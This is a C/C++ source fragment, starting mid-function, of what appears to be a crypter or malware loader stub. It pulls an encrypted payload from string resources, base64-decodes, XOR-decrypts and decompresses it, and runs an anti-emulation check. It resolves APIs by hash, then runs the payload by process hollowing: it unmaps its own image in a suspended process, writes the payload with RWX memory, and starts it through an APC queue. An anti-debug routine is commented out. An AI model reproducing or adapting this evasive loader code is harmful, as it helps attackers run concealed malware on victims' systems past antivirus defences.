	lpReturnBuffer = x_VirtualAlloc(NULL, dwChunkSize * (x - 1), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (lpReturnBuffer) {

		x = 1;

		while (HRSRC hResource = x_FindResourceW(NULL, (wchar_t*)x, (wchar_t*)RT_STRING)) {

			x_LoadResource = reinterpret_cast<API_DEFINES::t_LoadResource>(load_func(MODULE_BASE::KERNEL32, hash_LoadResource));
			HGLOBAL lpResourceData = x_LoadResource(NULL, hResource);

			if (lpResourceData) {

				x_LockResource = reinterpret_cast<API_DEFINES::t_LockResource>(load_func(MODULE_BASE::KERNEL32, hash_LockResource));
				LPVOID lpResource = x_LockResource(lpResourceData);

				if (lpResource) {

					m_memcpy((LPVOID)((DWORD)lpReturnBuffer + (dwChunkSize * (x - 1))), lpResource, dwChunkSize);
					x++;
				}
			}
		}
	}

	// Anti Emulation 1:
	// iswalpha (Random) 
	// ecx = 0x103

	LPVOID lpIsWalpha = load_func(MODULE_BASE::NTDLL, hash_iswalpha);
	DWORD ecx_value = 0;

	__asm	{
		push 0xAA4D83
			mov eax, lpIsWalpha
			call eax
			mov ecx_value, ecx
	}

	if (ecx_value != 0x103) {

		LPVOID lpExitProcess = load_func(MODULE_BASE::KERNEL32, hash_ExitProcess);

		while (ecx_value != 0x103) {
			__asm{
				push 0x103
					mov eax, lpExitProcess
					call eax
			}
		}
	}

	DWORD dwNewSize = 0;
	DWORD dwXPressSize = 0;
	DWORD dwSize = (dwChunkSize * (x - 1));

	lpReturnBuffer = base64Decode((char*)lpReturnBuffer, dwSize, &dwNewSize);
	xor_encrypt_decrypt((char*)lpReturnBuffer, dwNewSize);

	if (pSettings->bCompress) {
		lpReturnBuffer = DecompressData(lpReturnBuffer, dwNewSize, &dwXPressSize);
	}

	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)lpReturnBuffer;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)lpReturnBuffer + pIDH->e_lfanew);
	PIMAGE_SECTION_HEADER pLastSection = (PIMAGE_SECTION_HEADER)(((DWORD)lpReturnBuffer + pIDH->e_lfanew) + (0xF8 + ((pINH->FileHeader.NumberOfSections - 1) * 0x28)));

	*dwFileLenOut = pLastSection->PointerToRawData + pLastSection->SizeOfRawData; // Need a better way of calculating file size 

	return lpReturnBuffer;
}

DWORD __inline GetSectionProtection(DWORD sc) {
	DWORD dwResult = 0;
	if (sc & IMAGE_SCN_MEM_NOT_CACHED) dwResult |= PAGE_NOCACHE;
	if (sc & IMAGE_SCN_MEM_EXECUTE) {
		if (sc & IMAGE_SCN_MEM_READ) {
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_EXECUTE_READWRITE;	else	dwResult |= PAGE_EXECUTE_READ;
		}
		else {
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_EXECUTE_WRITECOPY;	else	dwResult |= PAGE_EXECUTE;
		}
	}
	else {
		if (sc & IMAGE_SCN_MEM_READ) {
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_READWRITE;	else dwResult |= PAGE_READONLY;
		}
		else {
			if (sc & IMAGE_SCN_MEM_WRITE)	dwResult |= PAGE_WRITECOPY;	else dwResult |= PAGE_NOACCESS;
		}
	}
	return dwResult;
}


void loader_load_pe(LPVOID lpExeBuffer, DWORD dwExeSize) {

	PPEB pPEB = (PPEB)__readfsdword(0x30);

	DWORD ImageBase = 0;
	DWORD ImageSize = 0;

	ImageBase = (DWORD)pPEB->ImageBaseAddress;

	PIMAGE_DOS_HEADER pSelfDosHeader = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS pSelfNtHeaders = (PIMAGE_NT_HEADERS)(ImageBase + pSelfDosHeader->e_lfanew);

	ImageSize = pSelfNtHeaders->OptionalHeader.SizeOfImage;

	PIMAGE_DOS_HEADER pPayloadDosHeader = (PIMAGE_DOS_HEADER)lpExeBuffer;
	PIMAGE_NT_HEADERS pPayloadNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpExeBuffer + pPayloadDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pRelocTable = (PIMAGE_DATA_DIRECTORY)&pPayloadNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	STARTUPINFOW SI = { 0 };
	PROCESS_INFORMATION PI = { 0 };

	CONTEXT CTX = { 0 };
	CTX.ContextFlags = CONTEXT_FULL;

	BOOL Result = 0;

	x_CreateProcessW = reinterpret_cast<API_DEFINES::t_CreateProcessW>(load_func(MODULE_BASE::KERNEL32, hash_CreateProcessW));

	Result = x_CreateProcessW(NULL, pPEB->ProcessParameters->ImagePathName.Buffer, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);

	x_NtGetContextThread = reinterpret_cast<API_DEFINES::t_NtGetContextThread>(load_func(MODULE_BASE::NTDLL, hash_NtGetContextThread));

	Result = NT_SUCCESS(x_NtGetContextThread(PI.hThread, &CTX));

	x_NtUnmapViewOfSection = reinterpret_cast<API_DEFINES::t_NtUnmapViewOfSection>(load_func(MODULE_BASE::NTDLL, hash_NtUnmapViewOfSection));

	Result = NT_SUCCESS(x_NtUnmapViewOfSection(PI.hProcess, (LPVOID)ImageBase));

	DWORD dwAllocationAttempts = 5;
	LPVOID lpAllocatedImageBase = 0;

	do {

		x_NtAllocateVirtualMemory = reinterpret_cast<API_DEFINES::t_NtAllocateVirtualMemory>(load_func(MODULE_BASE::NTDLL, hash_NtAllocateVirtualMemory));

		LPVOID lpImageBase = (LPVOID)ImageBase;
		DWORD dwImageSize = pPayloadNtHeaders->OptionalHeader.SizeOfImage;

		Result = NT_SUCCESS(x_NtAllocateVirtualMemory(PI.hProcess, &lpImageBase, NULL, &dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

		if (Result) {
			lpAllocatedImageBase = lpImageBase;
			break;
		}

		if (!Result && dwAllocationAttempts) {
			dwAllocationAttempts--;
			continue;
		}

	} while (dwAllocationAttempts);

	x_NtWriteVirtualMemory = reinterpret_cast<API_DEFINES::t_NtWriteVirtualMemory>(load_func(MODULE_BASE::NTDLL, hash_NtWriteVirtualMemory));
	x_NtProtectVirtualMemory = reinterpret_cast<API_DEFINES::t_NtProtectVirtualMemory>(load_func(MODULE_BASE::NTDLL, hash_NtProtectVirtualMemory));

	Result = NT_SUCCESS(x_NtWriteVirtualMemory(PI.hProcess, (LPVOID)ImageBase, lpExeBuffer, pPayloadNtHeaders->OptionalHeader.SizeOfHeaders, NULL));

	PIMAGE_SECTION_HEADER pISH = IMAGE_FIRST_SECTION(pPayloadNtHeaders);

	for (size_t i = 0; i < pPayloadNtHeaders->FileHeader.NumberOfSections; i++) {

		//if (!pISH->SizeOfRawData) {
		//	continue; // virtual section?
		//}

		Result = NT_SUCCESS(x_NtWriteVirtualMemory(PI.hProcess, (LPVOID)(ImageBase + pISH->VirtualAddress), (LPVOID)((DWORD)lpExeBuffer + pISH->PointerToRawData), pISH->SizeOfRawData, NULL));

		LPVOID lpProtectAddress = (LPVOID)(ImageBase + pISH->VirtualAddress);
		DWORD dwProtectSize = pISH->Misc.VirtualSize;
		DWORD dwOld = 0;

		Result = NT_SUCCESS(x_NtProtectVirtualMemory(PI.hProcess, &lpProtectAddress, &dwProtectSize, GetSectionProtection(pISH->Characteristics), &dwOld));

		pISH++;
	}

	CTX.Eax = (DWORD)(ImageBase + pPayloadNtHeaders->OptionalHeader.AddressOfEntryPoint);

	x_NtQueueApcThread = reinterpret_cast<API_DEFINES::t_NtQueueApcThread>(load_func(MODULE_BASE::NTDLL, hash_NtQueueApcThread));
	Result = NT_SUCCESS(x_NtQueueApcThread(PI.hThread, (API_DEFINES::PIO_APC_ROUTINE)CTX.Eax, NULL, NULL, NULL));

	x_NtAlertResumeThread = reinterpret_cast<API_DEFINES::t_NtAlertResumeThread>(load_func(MODULE_BASE::NTDLL, hash_NtAlertResumeThread));

	DWORD dwSuspendCount = 0;
	Result = NT_SUCCESS(x_NtAlertResumeThread(PI.hThread, &dwSuspendCount));

	/*x_NtSetContextThread = reinterpret_cast<API_DEFINES::t_NtSetContextThread>(load_func(MODULE_BASE::NTDLL, hash_NtSetContextThread));
	x_NtSetContextThread(PI.hThread, &CTX);

	x_NtResumeThread = reinterpret_cast<API_DEFINES::t_NtResumeThread>(load_func(MODULE_BASE::NTDLL, hash_NtResumeThread));
	x_NtResumeThread(PI.hThread, nullptr);*/

	// Anti-Debug
	/*DebugActiveProcess(PI.dwProcessId);
	DEBUG_EVENT de = { 0 };

	while (true) {

	WaitForDebugEvent(&de, INFINITE);

	DWORD dwContinueFlag = DBG_CONTINUE;

	if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
	dwContinueFlag = DBG_EXCEPTION_NOT_HANDLED;
	}

	ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueFlag);
	}*/
}

#endif